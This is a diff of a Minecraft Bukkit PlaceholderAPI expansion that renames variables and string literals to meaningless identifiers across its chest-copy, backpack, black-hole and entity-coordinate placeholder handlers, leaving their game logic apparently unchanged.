-                return "Invalid format! Use: %Archistructure_viewChest_sourceWorld,x,y,z%";
+            String params = f1.substring(dokyfupkdoapdf.length());
+            String[] parts = params.split(keep);
+            if (parts.length != INT7) {
+                return fpydnwfypudnfpd;
             }
-            String sourceWorldName = parts[0];
-            int srcX, srcY, srcZ;
+            String wfdyewyufpdn = parts[I];
+            int wtdhfwd, wfdbywfd, wfktywfnkt;
             try {
-                srcX = Integer.parseInt(parts[1]);
-                srcY = Integer.parseInt(parts[2]);
-                srcZ = Integer.parseInt(parts[3]);
+                wtdhfwd = Integer.parseInt(parts[INT3]);
+                wfdbywfd = Integer.parseInt(parts[mill2]);
+                wfktywfnkt = Integer.parseInt(parts[ccp]);
             } catch (NumberFormatException e) {
-                return "Invalid coordinates!";
+                return awufdwfda;
             }
-            World sourceWorld = Bukkit.getWorld(sourceWorldName);
-            if (sourceWorld == null) return "Source world not found!";
-            Location sourceLoc = new Location(sourceWorld, srcX, srcY, srcZ);
-            Block sourceBlock = sourceLoc.getBlock();
-            if (sourceBlock.getType() != Material.CHEST) {
-                return "No chest found at source location!";
+            World tmkyuwfdt = Bukkit.getWorld(wfdyewyufpdn);
+            if (tmkyuwfdt == null) return dywufndoywuand;
+            Location wtkyfwdtkwfdt = new Location(tmkyuwfdt, wtdhfwd, wfdbywfd, wfktywfnkt);
+            Block fwtyuwnfdfwd = wtkyfwdtkwfdt.getBlock();
+            if (fwtyuwnfdfwd.getType() != Material.CHEST) {
+                return taywfuntarosdulf;
             }
-            Chest sourceChest = (Chest) sourceBlock.getState();
+            Chest wfdkyfwdkyfwud = (Chest) fwtyuwnfdfwd.getState();
 
-            boolean isDouble = sourceChest.getInventory().getSize() > 27;
+            boolean wtyufwntyunwfd = wfdkyfwdkyfwud.getInventory().getSize() > INT5;
             if (g6) {
-                f2.sendMessage("DEBUG: Source chest at " + srcX + " " + srcY + " " + srcZ +
-                        " detected. It is " + (isDouble ? "double" : "single") + ".");
+                f2.sendMessage(wkfdwya + wtdhfwd + sowhat + wfdbywfd + sowhat + wfktywfnkt +
+                        pydaunfw + (wtyufwntyunwfd ? dyanuowfd : wfktdyawfd) + wyfdunafwd);
             }
 
             // Use a fixed destination in the "mcydatabase" world.
-            World destWorld = Bukkit.getWorld("mcydatabase");
-            if (destWorld == null) {
-                destWorld = Bukkit.createWorld(new WorldCreator("mcydatabase")
+            World wftuynfdyuw = Bukkit.getWorld(fwdyunwfydunfwd);
+            if (wftuynfdyuw == null) {
+                wftuynfdyuw = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                         .environment(World.Environment.NORMAL)
-                        .generateStructures(false)
+                        .generateStructures(arsdienwdhw)
                         .type(WorldType.FLAT));
-                Bukkit.getLogger().info("Created mcydatabase world.");
+                Bukkit.getLogger().info(wydkawyfpudawfd);
             }
 
 
-            int destX, destY, destZ;
-            String playerKey = f2.getUniqueId().toString();
-            String storedCoords = g20.getString(playerKey);
-            if (storedCoords != null) {
+            int pfdypd, wfdybfwd, tmfwyd;
+            String tywufnd = f2.getUniqueId().toString();
+            String aoienrsh = g20.getString(tywufnd);
+            if (aoienrsh != null) {
                 // An entry exists for this player; use it.
-                String[] coords = storedCoords.split(" ");
-                destX = Integer.parseInt(coords[0]);
-                destY = Integer.parseInt(coords[1]);
-                destZ = Integer.parseInt(coords[2]);
+                String[] oienarst = aoienrsh.split(sowhat);
+                pfdypd = Integer.parseInt(oienarst[I]);
+                wfdybfwd = Integer.parseInt(oienarst[INT3]);
+                tmfwyd = Integer.parseInt(oienarst[mill2]);
             } else {
                 // No entry exists, so compute new coordinates.
                 // Use the "last" entry in viewOnlyChestConfig; if missing, use defaults.
-                String lastEntry = g20.getString("last");
-                int lastX, lastY, lastZ;
-                if (lastEntry == null) {
+                String neoitsra = g20.getString(aoienrstd);
+                int qoienfwgp, neiotstw, ubfwtwfyutnwfyd;
+                if (neoitsra == null) {
                     // No previous entries: default to chunk X = 9, chunk Z = 9, relative X = 0, relative Z = 0, Y = world minimum.
-                    lastX = 9 * 16;
-                    lastZ = 9 * 16;
-                    assert destWorld != null;
-                    lastY = destWorld.getMinHeight();
+                    qoienfwgp = oiwfndtoyu42nd24 * INT4;
+                    ubfwtwfyutnwfyd = oiwfndtoyu42nd24 * INT4;
+                    assert wftuynfdyuw != null;
+                    neiotstw = wftuynfdyuw.getMinHeight();
                 } else {
-                    String[] lastParts = lastEntry.split(" ");
-                    lastX = Integer.parseInt(lastParts[0]);
-                    lastY = Integer.parseInt(lastParts[1]);
-                    lastZ = Integer.parseInt(lastParts[2]);
+                    String[] udtnwyadnwfpd = neoitsra.split(sowhat);
+                    qoienfwgp = Integer.parseInt(udtnwyadnwfpd[I]);
+                    neiotstw = Integer.parseInt(udtnwyadnwfpd[INT3]);
+                    ubfwtwfyutnwfyd = Integer.parseInt(udtnwyadnwfpd[mill2]);
                 }
                 // Step 1: Add 2 to the last entry's z.
-                destX = lastX;
-                destY = lastY;
-                destZ = lastZ + 2;
+                pfdypd = qoienfwgp;
+                wfdybfwd = neiotstw;
+                tmfwyd = ubfwtwfyutnwfyd + mill2;
                 // Step 2: If new z >= 16 (relative to the chunk), reset z to 0 and increment x by 2.
-                int relZ = destZ % 16;
-                if (relZ >= 16) { // In practice, since we add 2, check if relZ >= 16.
-                    destZ = (destZ / 16) * 16; // reset relative z to 0
-                    destX = lastX + 2;
+                int wpdkywpnfd = tmfwyd % INT4;
+                if (wpdkywpnfd >= INT4) { // In practice, since we add 2, check if relZ >= 16.
+                    tmfwyd = (tmfwyd / INT4) * INT4; // reset relative z to 0
+                    pfdypd = qoienfwgp + mill2;
                 }
                 // Step 3: If new x's relative value is >= 16, set x=0 and increment y by 1.
-                int relX = destX % 16;
-                if (relX >= 16) {
-                    destX = (destX / 16) * 16;
-                    destY = lastY + 1;
+                int wfkdywfd = pfdypd % INT4;
+                if (wfkdywfd >= INT4) {
+                    pfdypd = (pfdypd / INT4) * INT4;
+                    wfdybfwd = neiotstw + INT3;
                 }
                 // Step 4: If y is past the build limit, set y to the minimum and increment x by 16.
-                assert destWorld != null;
-                if (destY > destWorld.getMaxHeight()) {
-                    destY = destWorld.getMinHeight();
-                    destX = lastX + 16;
+                assert wftuynfdyuw != null;
+                if (wfdybfwd > wftuynfdyuw.getMaxHeight()) {
+                    wfdybfwd = wftuynfdyuw.getMinHeight();
+                    pfdypd = qoienfwgp + INT4;
                 }
                 // Store the computed coordinates under the player's UUID and update the "last" entry.
-                String newCoords = destX + " " + destY + " " + destZ;
-                g20.set(playerKey, newCoords);
-                g20.set("last", newCoords);
+                String wdkyud = pfdypd + sowhat + wfdybfwd + sowhat + tmfwyd;
+                g20.set(tywufnd, wdkyud);
+                g20.set(aoienrstd, wdkyud);
                 try {
                     g20.save(g16);
                 } catch (IOException ignored) {
@@ -7187,133 +7901,133 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
             // Now, place chests at the computed coordinates—but only if we computed them now.
             // If the player's entry already existed, we skip placement.
-            if (storedCoords == null) {
+            if (aoienrsh == null) {
                 // Place a single chest at (destX, destY, destZ)
-                Location singleLoc = new Location(destWorld, destX, destY, destZ);
-                Block singleBlock = singleLoc.getBlock();
-                if (singleBlock.getType() != Material.CHEST) {
-                    singleBlock.setType(Material.CHEST);
+                Location wfdkywfpd = new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd);
+                Block tbwflbd = wfdkywfpd.getBlock();
+                if (tbwflbd.getType() != Material.CHEST) {
+                    tbwflbd.setType(Material.CHEST);
                 } 
                 // Place a double chest at (destX, destY, destZ+1) and (destX+1, destY, destZ+1)
-                Location doubleLoc1 = new Location(destWorld, destX, destY, destZ + 1);
-                Location doubleLoc2 = new Location(destWorld, destX + 1, destY, destZ + 1);
-                Block doubleBlock1 = doubleLoc1.getBlock();
-                Block doubleBlock2 = doubleLoc2.getBlock();
-                if (doubleBlock1.getType() != Material.CHEST || doubleBlock2.getType() != Material.CHEST) {
-                    doubleBlock1.setType(Material.CHEST);
-                    doubleBlock2.setType(Material.CHEST);
+                Location wtyunwfdafd = new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd + INT3);
+                Location tfwkyundf = new Location(wftuynfdyuw, pfdypd + INT3, wfdybfwd, tmfwyd + INT3);
+                Block twfklb = wtyunwfdafd.getBlock();
+                Block tkyfbd = tfwkyundf.getBlock();
+                if (twfklb.getType() != Material.CHEST || tkyfbd.getType() != Material.CHEST) {
+                    twfklb.setType(Material.CHEST);
+                    tkyfbd.setType(Material.CHEST);
                     // Link the double chest halves
-                    Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), () -> {
+                    Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                         try {
-                            Chest chestA = (Chest) doubleBlock1.getState();
-                            Chest chestB = (Chest) doubleBlock2.getState();
-                            org.bukkit.block.data.type.Chest dataA = (org.bukkit.block.data.type.Chest) chestA.getBlockData();
-                            org.bukkit.block.data.type.Chest dataB = (org.bukkit.block.data.type.Chest) chestB.getBlockData();
-                            dataA.setType(org.bukkit.block.data.type.Chest.Type.LEFT);
-                            dataB.setType(org.bukkit.block.data.type.Chest.Type.RIGHT);
-                            dataA.setFacing(BlockFace.NORTH);
-                            dataB.setFacing(BlockFace.NORTH);
-                            chestA.setBlockData(dataA);
-                            chestB.setBlockData(dataB);
-                            String commonName = f2.getUniqueId().toString();
-                            chestA.setCustomName(commonName);
-                            chestB.setCustomName(commonName);
-                            chestA.update(true);
-                            chestB.update(true);
+                            Chest dwnyuwnfd = (Chest) twfklb.getState();
+                            Chest yudanwyofdunawfpd = (Chest) tkyfbd.getState();
+                            org.bukkit.block.data.type.Chest kwdynwdkwf = (org.bukkit.block.data.type.Chest) dwnyuwnfd.getBlockData();
+                            org.bukkit.block.data.type.Chest dwtbfldbwufd = (org.bukkit.block.data.type.Chest) yudanwyofdunawfpd.getBlockData();
+                            kwdynwdkwf.setType(org.bukkit.block.data.type.Chest.Type.LEFT);
+                            dwtbfldbwufd.setType(org.bukkit.block.data.type.Chest.Type.RIGHT);
+                            kwdynwdkwf.setFacing(BlockFace.NORTH);
+                            dwtbfldbwufd.setFacing(BlockFace.NORTH);
+                            dwnyuwnfd.setBlockData(kwdynwdkwf);
+                            yudanwyofdunawfpd.setBlockData(dwtbfldbwufd);
+                            String tkfwyudywfnd = f2.getUniqueId().toString();
+                            dwnyuwnfd.setCustomName(tkfwyudywfnd);
+                            yudanwyofdunawfpd.setCustomName(tkfwyudywfnd);
+                            dwnyuwnfd.update(NEW_VALUE1);
+                            yudanwyofdunawfpd.update(NEW_VALUE1);
                         } catch (Exception ignored) {
                         }
-                    }, 1L);
+                    }, healing);
                 } 
             } 
 
 
-            Location destLocation = isDouble ? new Location(destWorld, destX, destY, destZ + 1) : new Location(destWorld, destX, destY, destZ);
+            Location tfwyndtywfnd = wtyufwntyunwfd ? new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd + INT3) : new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd);
 
-            Chest destChest = (Chest) (destLocation.getBlock().getState());
+            Chest twkfdtyfndw = (Chest) (tfwyndtywfnd.getBlock().getState());
 
 
             // Build a modified inventory: copy items from the source chest (modifying the ei-id) and fill any missing slots with a default pane.
-            Inventory sourceInv = sourceChest.getInventory();
-            int sourceSize = sourceInv.getSize();
-            int destSize = isDouble ? 54 : 27;
+            Inventory fwdwfyedunfwd = wfdkyfwdkyfwud.getInventory();
+            int tfwyukdywfpud = fwdwfyedunfwd.getSize();
+            int tywfndaywbkd = wtyufwntyunwfd ? INT6 : INT5;
 
-            ItemStack[] newContents = new ItemStack[destSize];
-            for (int i = 0; i < destSize; i++) {
-                if (i < sourceSize && sourceInv.getItem(i) != null) {
-                    newContents[i] = f1(Objects.requireNonNull(sourceInv.getItem(i)));
+            ItemStack[] twyfladhylwfdh = new ItemStack[tywfndaywbkd];
+            for (int dtkwyfudwd = I; dtkwyfudwd < tywfndaywbkd; dtkwyfudwd++) {
+                if (dtkwyfudwd < tfwyukdywfpud && fwdwfyedunfwd.getItem(dtkwyfudwd) != null) {
+                    twyfladhylwfdh[dtkwyfudwd] = f1(Objects.requireNonNull(fwdwfyedunfwd.getItem(dtkwyfudwd)));
                 } else {
-                    newContents[i] = f0();
+                    twyfladhylwfdh[dtkwyfudwd] = f0();
                 }
             }
             // Update destination chest inventory without an extra clear call (setContents overrides existing items)
             try {
-                destChest.update();
+                twkfdtyfndw.update();
 
-                destChest.getInventory().setContents(newContents);
+                twkfdtyfndw.getInventory().setContents(twyfladhylwfdh);
             } catch (Exception ex) {
-                return "Error updating destination chest inventory.";
+                return wdypfauwdnwfpd;
             }
 
             // Return the destination coordinates.
             if (g6) {
-                f2.sendMessage("DEBUG: viewChest processing complete. Returning coordinates: " + destX + " " + destY + " " + destZ);
+                f2.sendMessage(tyabfydkfpydnpfd + pfdypd + sowhat + wfdybfwd + sowhat + tmfwyd);
             }
-            return isDouble ? destX + " " + destY + " " + (destZ + 1 ): destX + " " + destY + " " + destZ;
+            return wtyufwntyunwfd ? pfdypd + sowhat + wfdybfwd + sowhat + (tmfwyd + INT3): pfdypd + sowhat + wfdybfwd + sowhat + tmfwyd;
         }
 
 
 
 
-        if (f1.startsWith("blackHole_")) {
+        if (f1.startsWith(wyndaoyfwpudnfpd)) {
             
             try {
-                String[] parts = f1.substring("blackHole_".length()).split(",");
-                if (parts.length != 5) {
-                    return "Invalid format!";
+                String[] dylpfdafp = f1.substring(wyndaoyfwpudnfpd.length()).split(keep);
+                if (dylpfdafp.length != xm) {
+                    return dyunwypfudnawfdyun;
                 }
 
-                String worldName = parts[0];
-                int x = Integer.parseInt(parts[1]);
-                int y = Integer.parseInt(parts[2]);
-                int z = Integer.parseInt(parts[3]);
-                int radius = Integer.parseInt(parts[4]);
+                String fuanidkaywdh = dylpfdafp[I];
+                int wfytdnwfydun = Integer.parseInt(dylpfdafp[INT3]);
+                int wfdtyunwfdyunfwd = Integer.parseInt(dylpfdafp[mill2]);
+                int wfyudnywufndwfd = Integer.parseInt(dylpfdafp[ccp]);
+                int wyufdnyounawfd = Integer.parseInt(dylpfdafp[INT7]);
 
-                World world = Bukkit.getWorld(worldName);
-                if (world == null) {
-                    return "World not found!";
+                World ftonoyruinsdw = Bukkit.getWorld(fuanidkaywdh);
+                if (ftonoyruinsdw == null) {
+                    return wfduynwyaufnd;
                 }
                 
 
-                Location center = new Location(world, x, y, z);
+                Location ydnoayfupdnwfpd = new Location(ftonoyruinsdw, wfytdnwfydun, wfdtyunwfdyunfwd, wfyudnywufndwfd);
 
 
-                org.bukkit.Location cen = center;
-                double r1 = 30;
-                String label = "BlackHole";
+                org.bukkit.Location twfutnyuwfnd = ydnoayfupdnwfpd;
+                double wdwfpyudnwfypud = tyafndydpfw;
+                String label = fysoadunofwypdun;
 
 
-                double r2 = r1 * r1;
-                for (org.bukkit.entity.Player playaa : world.getPlayers()) {
-                    if (playaa.getLocation().distanceSquared(cen) <= r2) {
-                        wm(playaa, label);
+                double ywundaoywufdnp = wdwfpyudnwfypud * wdwfpyudnwfypud;
+                for (org.bukkit.entity.Player yufpdnoafyupdpd : ftonoyruinsdw.getPlayers()) {
+                    if (yufpdnoafyupdpd.getLocation().distanceSquared(twfutnyuwfnd) <= ywundaoywufdnp) {
+                        wm(yufpdnoafyupdpd, label);
                     }
                 }
                 // Convert blocks to falling blocks
-                f1(world, center, radius);
+                f1(ftonoyruinsdw, ydnoayfupdnwfpd, wyufdnyounawfd);
 
                 // Attract entities to the center
-                f2(world, center, radius);
+                f2(ftonoyruinsdw, ydnoayfupdnwfpd, wyufdnyounawfd);
 
-                return x + " " + y + " " + z;
+                return wfytdnwfydun + sowhat + wfdtyunwfdyunfwd + sowhat + wfyudnywufndwfd;
             } catch (Exception e) {
                 e.printStackTrace();
-                return "x" + e.getMessage();
+                return NEW_VALUE_3 + e.getMessage();
             }
         }
 
 
-        if (f1.startsWith("x_")) {
-            String uuidString = f1.substring("x_".length());
+        if (f1.startsWith(yrsndoawyfudn)) {
+            String uuidString = f1.substring(yrsndoawyfudn.length());
             try {
                 UUID uuid = UUID.fromString(uuidString);
                 Entity entity = Bukkit.getEntity(uuid);
@@ -7322,13 +8036,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     return String.format("%.3f", x);
                 }
             } catch (IllegalArgumentException e) {
-                return "x";
+                return NEW_VALUE_3;
             }
-            return "x";
+            return NEW_VALUE_3;
         }
 
-        if (f1.startsWith("y_")) {
-            String uuidString = f1.substring("y_".length());
+        if (f1.startsWith(swyadunwfoydun)) {
+            String uuidString = f1.substring(swyadunwfoydun.length());
             try {
                 UUID uuid = UUID.fromString(uuidString);
                 Entity entity = Bukkit.getEntity(uuid);
@@ -7337,13 +8051,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     return String.format("%.3f", y);
                 }
             } catch (IllegalArgumentException e) {
-                return "x";
+                return NEW_VALUE_3;
             }
-            return "x";
+            return NEW_VALUE_3;
         }
 
-        if (f1.startsWith("z_")) {
-            String uuidString = f1.substring("z_".length());
+        if (f1.startsWith(naoyfdundfw)) {
+            String uuidString = f1.substring(naoyfdundfw.length());
             try {
                 UUID uuid = UUID.fromString(uuidString);
                 Entity entity = Bukkit.getEntity(uuid);
@@ -7352,196 +8066,196 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     return String.format("%.3f", z);
                 }
             } catch (IllegalArgumentException e) {
-                return "x";
+                return NEW_VALUE_3;
             }
-            return "x";
+            return NEW_VALUE_3;
         }
 
 
 
-        if (f1.startsWith("openBackpack2_")) {
-            wm(f2, "Backpack");
-            long id = Long.parseLong(f1.substring("openBackpack2_".length()));
+        if (f1.startsWith(owayfudny34hyfundywfudw)) {
+            wm(f2, fudnoaywfudhoywafld);
+            long wfdynwduyfn = Long.parseLong(f1.substring(owayfudny34hyfundywfudw.length()));
 
             // Get or create the world
-            World world = Bukkit.getWorld("mcydatabase");
-            if (world == null) {
-                world = Bukkit.createWorld(new WorldCreator("mcydatabase")
+            World wyfldhwfydh = Bukkit.getWorld(fwdyunwfydunfwd);
+            if (wyfldhwfydh == null) {
+                wyfldhwfydh = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                         .environment(World.Environment.NORMAL)
-                        .generateStructures(false)
+                        .generateStructures(arsdienwdhw)
                         .type(WorldType.FLAT));
-                Bukkit.getLogger().info("Created the mcydatabase world.");
+                Bukkit.getLogger().info(fwaodhwfypdh);
             }
 
             // Get player UUID
-            String uuid = f2.getUniqueId().toString();
+            String wfdnwyfudnwyfudnwfd = f2.getUniqueId().toString();
 
             // Load or assign coordinates from the double chest database
-            int x, y, z;
-            String coordinates = g17.getString(uuid);
-            if (coordinates != null) {
-                String[] coords = coordinates.split(" ");
-                x = Integer.parseInt(coords[0]);
-                y = Integer.parseInt(coords[1]);
-                z = Integer.parseInt(coords[2]);
+            int wfdyunwyfdn, wtulhwfulhd, tyfwunyunfdt;
+            String yfuntya = g17.getString(wfdnwyfudnwyfudnwfd);
+            if (yfuntya != null) {
+                String[] fwdyafpndoyafudn = yfuntya.split(sowhat);
+                wfdyunwyfdn = Integer.parseInt(fwdyafpndoyafudn[I]);
+                wtulhwfulhd = Integer.parseInt(fwdyafpndoyafudn[INT3]);
+                tyfwunyunfdt = Integer.parseInt(fwdyafpndoyafudn[mill2]);
             } else {
                 // Assign new coordinates in a chunk-efficient way
-                assert world != null;
-                int[] newCoords = f2(world);
-                x = newCoords[0];
-                y = newCoords[1];
-                z = newCoords[2];
+                assert wyfldhwfydh != null;
+                int[] fdynyfpdunfpd = f2(wyfldhwfydh);
+                wfdyunwyfdn = fdynyfpdunfpd[I];
+                wtulhwfulhd = fdynyfpdunfpd[INT3];
+                tyfwunyunfdt = fdynyfpdunfpd[mill2];
 
                 // Save the assigned coordinates to the double chest database
-                String newCoordinates = x + " " + y + " " + z;
-                g17.set(uuid, newCoordinates);
+                String pndyounpdwfiorensat = wfdyunwyfdn + sowhat + wtulhwfulhd + sowhat + tyfwunyunfdt;
+                g17.set(wfdnwyfudnwyfudnwfd, pndyounpdwfiorensat);
                 f3();
             }
 
             // Create the double chest at the given coordinates if not already present
-            Location loc1 = new Location(world, x, y, z);
-            Location loc2 = new Location(world, x + 1, y, z); // Adjacent chest for double chest pair
+            Location oyfpndoyualf = new Location(wyfldhwfydh, wfdyunwyfdn, wtulhwfulhd, tyfwunyunfdt);
+            Location hyhdyunk = new Location(wyfldhwfydh, wfdyunwyfdn + INT3, wtulhwfulhd, tyfwunyunfdt); // Adjacent chest for double chest pair
 
-            Block block1 = loc1.getBlock();
-            Block block2 = loc2.getBlock();
+            Block yunypdb = oyfpndoyualf.getBlock();
+            Block kvyfkbyuvnp = hyhdyunk.getBlock();
 
-            if (!(block1.getState() instanceof Chest) || !(block2.getState() instanceof Chest)) {
-                block1.setType(Material.CHEST);
-                block2.setType(Material.CHEST);
+            if (!(yunypdb.getState() instanceof Chest) || !(kvyfkbyuvnp.getState() instanceof Chest)) {
+                yunypdb.setType(Material.CHEST);
+                kvyfkbyuvnp.setType(Material.CHEST);
 
                 // Wait for the world to register the chest placement
-                Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), () -> {
-                    Chest chest1 = (Chest) block1.getState();
-                    Chest chest2 = (Chest) block2.getState();
+                Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
+                    Chest nylhbylhf = (Chest) yunypdb.getState();
+                    Chest kdynpfkdwfpd = (Chest) kvyfkbyuvnp.getState();
 
                     // Update the block data to link them as a double chest
-                    chest1.setCustomName(String.valueOf(id));
-                    chest1.update(true);
-                    chest2.setCustomName(String.valueOf(id));
-                    chest2.update(true);
+                    nylhbylhf.setCustomName(String.valueOf(wfdynwduyfn));
+                    nylhbylhf.update(NEW_VALUE1);
+                    kdynpfkdwfpd.setCustomName(String.valueOf(wfdynwduyfn));
+                    kdynpfkdwfpd.update(NEW_VALUE1);
 
-                    Bukkit.getLogger().info("Double chest created at " + x + ", " + y + ", " + z);
-                }, 1L);
+                    Bukkit.getLogger().info(fydnoafypudkopnbkdf + wfdyunwyfdn + wyudnywufodn + wtulhwfulhd + wyudnywufodn + tyfwunyunfdt);
+                }, healing);
                 }
 
-            Chest chest1 = (Chest) block1.getState();
+            Chest ydunayfpwodnu = (Chest) yunypdb.getState();
 
             // Save current chest contents if the chest is already named
-            String currentChestName = chest1.getCustomName();
-            if (currentChestName != null && !currentChestName.isEmpty()) {
-                f2(currentChestName, chest1.getInventory().getContents());
+            String kybvkfpyb = ydunayfpwodnu.getCustomName();
+            if (kybvkfpyb != null && !kybvkfpyb.isEmpty()) {
+                f2(kybvkfpyb, ydunayfpwodnu.getInventory().getContents());
             }
 
             // Set the new chest name and update it
-            chest1.setCustomName(String.valueOf(id));
-            chest1.update(true);
-            chest1.getInventory().clear();
+            ydunayfpwodnu.setCustomName(String.valueOf(wfdynwduyfn));
+            ydunayfpwodnu.update(NEW_VALUE1);
+            ydunayfpwodnu.getInventory().clear();
 
             // Load the new chest contents from the file if available
-            ItemStack[] savedContents = f(String.valueOf(id));
-            if (savedContents != null) {
-                chest1.getInventory().setContents(savedContents);
-                Bukkit.getLogger().info("Loaded double chest contents for chest ID: " + id);
+            ItemStack[] wfydunfaoyupdn = f(String.valueOf(wfdynwduyfn));
+            if (wfydunfaoyupdn != null) {
+                ydunayfpwodnu.getInventory().setContents(wfydunfaoyupdn);
+                Bukkit.getLogger().info(foaybkfpoyubhl + wfdynwduyfn);
             } else {
-                Bukkit.getLogger().info("No previous contents found for double chest ID: " + id);
+                Bukkit.getLogger().info(pfwydoakfopydhfpwoyd + wfdynwduyfn);
             }
 
-            return x + " " + y + " " + z;
+            return wfdyunwyfdn + sowhat + wtulhwfulhd + sowhat + tyfwunyunfdt;
         }
 
         
         
-        if (f1.startsWith("openBackpack_")) {
-            wm(f2, "Backpack");
-            long id = Long.parseLong(f1.substring("openBackpack_".length()));
+        if (f1.startsWith(yofapdnoyfpubdhfyp)) {
+            wm(f2, fudnoaywfudhoywafld);
+            long wfyfdnhaoyfpohdoypfh = Long.parseLong(f1.substring(yofapdnoyfpubdhfyp.length()));
 
             // Get or create the world
-            World world = Bukkit.getWorld("mcydatabase");
-            if (world == null) {
-                world = Bukkit.createWorld(new WorldCreator("mcydatabase")
+            World fpydaohfpybdhafp = Bukkit.getWorld(fwdyunwfydunfwd);
+            if (fpydaohfpybdhafp == null) {
+                fpydaohfpybdhafp = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                         .environment(World.Environment.NORMAL)
-                        .generateStructures(false)
+                        .generateStructures(arsdienwdhw)
                         .type(WorldType.FLAT));
-                Bukkit.getLogger().info("Created the mcydatabase world.");
+                Bukkit.getLogger().info(fwaodhwfypdh);
             }
 
             // Get player UUID
-            String uuid = f2.getUniqueId().toString();
+            String ydonfpoayudnofypd = f2.getUniqueId().toString();
 
             // Load or assign coordinates from the database
-            int x, y, z;
-            String coordinates = g18.getString(uuid);
-            if (coordinates != null) {
-                String[] coords = coordinates.split(" ");
-                x = Integer.parseInt(coords[0]);
-                y = Integer.parseInt(coords[1]);
-                z = Integer.parseInt(coords[2]);
+            int tkywnfbdtywlfhd, wyfdbtylwfbdylwfb, wyfudntywund;
+            String wfydlbwyfld = g18.getString(ydonfpoayudnofypd);
+            if (wfydlbwyfld != null) {
+                String[] kydkpfd = wfydlbwyfld.split(sowhat);
+                tkywnfbdtywlfhd = Integer.parseInt(kydkpfd[I]);
+                wyfdbtylwfbdylwfb = Integer.parseInt(kydkpfd[INT3]);
+                wyfudntywund = Integer.parseInt(kydkpfd[mill2]);
             } else {
                 // Assign new coordinates in a chunk-efficient way
-                assert world != null;
-                int[] newCoords = f1(world);
-                x = newCoords[0];
-                y = newCoords[1];
-                z = newCoords[2];
+                assert fpydaohfpybdhafp != null;
+                int[] nyuwdnywufndwfpdk = f1(fpydaohfpybdhafp);
+                tkywnfbdtywlfhd = nyuwdnywufndwfpdk[I];
+                wyfdbtylwfbdylwfb = nyuwdnywufndwfpdk[INT3];
+                wyfudntywund = nyuwdnywufndwfpdk[mill2];
 
                 // Save the assigned coordinates to the database
-                String newCoordinates = x + " " + y + " " + z;
-                g18.set(uuid, newCoordinates);
+                String dknywufpndyuwpfnd = tkywnfbdtywlfhd + sowhat + wyfdbtylwfbdylwfb + sowhat + wyfudntywund;
+                g18.set(ydonfpoayudnofypd, dknywufpndyuwpfnd);
                 f2();
             }
 
             // Create the chest at the given coordinates if not already present
-            Location loc = new Location(world, x, y, z);
-            Block block = loc.getBlock();
-            if (!(block.getState() instanceof Chest)) {
-                block.setType(Material.CHEST);
-                Bukkit.getLogger().info("Backpack chest created at " + x + ", " + y + ", " + z);
+            Location thnylhyh34d = new Location(fpydaohfpybdhafp, tkywnfbdtywlfhd, wyfdbtylwfbdylwfb, wyfudntywund);
+            Block dnuyn4 = thnylhyh34d.getBlock();
+            if (!(dnuyn4.getState() instanceof Chest)) {
+                dnuyn4.setType(Material.CHEST);
+                Bukkit.getLogger().info(iedn4dn8394d + tkywnfbdtywlfhd + wyudnywufodn + wyfdbtylwfbdylwfb + wyudnywufodn + wyfudntywund);
             }
 
-            Chest chest = (Chest) block.getState();
+            Chest y3u4dny = (Chest) dnuyn4.getState();
 
 // Check if the chest already has a name and save its contents before updating
-            String currentChestName = chest.getCustomName();
-            if (currentChestName != null && !currentChestName.isEmpty()) {
+            String kde3n4 = y3u4dny.getCustomName();
+            if (kde3n4 != null && !kde3n4.isEmpty()) {
                 // Save the existing chest contents to a file based on its current name
-                f1(currentChestName, chest.getInventory().getContents());
+                f1(kde3n4, y3u4dny.getInventory().getContents());
             }
 
 // Update the chest name and clear its contents
-            chest.setCustomName(String.valueOf(id));
-            chest.update(true);
-            chest.getInventory().clear();
+            y3u4dny.setCustomName(String.valueOf(wfyfdnhaoyfpohdoypfh));
+            y3u4dny.update(NEW_VALUE1);
+            y3u4dny.getInventory().clear();
 
 // Load the new chest contents from the file if available
-            ItemStack[] savedContents = f1(String.valueOf(id));
-            if (savedContents != null) {
-                chest.getInventory().setContents(savedContents);
-                Bukkit.getLogger().info("Loaded backpack contents for chest ID: " + id);
+            ItemStack[] miedn4342 = f1(String.valueOf(wfyfdnhaoyfpohdoypfh));
+            if (miedn4342 != null) {
+                y3u4dny.getInventory().setContents(miedn4342);
+                Bukkit.getLogger().info(oi2n43g234g + wfyfdnhaoyfpohdoypfh);
             } else {
-                Bukkit.getLogger().info("No previous contents found for chest ID: " + id);
+                Bukkit.getLogger().info(enhien4g + wfyfdnhaoyfpohdoypfh);
             }
 
-            return x + " " + y + " " + z;
+            return tkywnfbdtywlfhd + sowhat + wyfdbtylwfbdylwfb + sowhat + wyfudntywund;
         }
 
-        final double NUDGE_AMOUNT = 0.05;
+        final double NUDGE_AMOUNT = kiek4d;
 
-        if (f1.startsWith("bounce2_")) {
+        if (f1.startsWith(yfnvdyfupbd)) {
             // Format: %Archistructure_bounce2_UUID,FACE,PITCH,YAW,VELOCITY%
-            String[] parts = f1.substring("bounce2_".length()).split(",");
+            String[] parts = f1.substring(yfnvdyfupbd.length()).split(keep);
 
-            if (parts.length != 5) return "Invalid format!";
+            if (parts.length != xm) return dyunwypfudnawfdyun;
 
             UUID uuid;
             try {
-                uuid = UUID.fromString(parts[0]);
+                uuid = UUID.fromString(parts[I]);
             } catch (IllegalArgumentException e) {
                 return "Invalid UUID!";
             }
 
             BlockFace face;
             try {
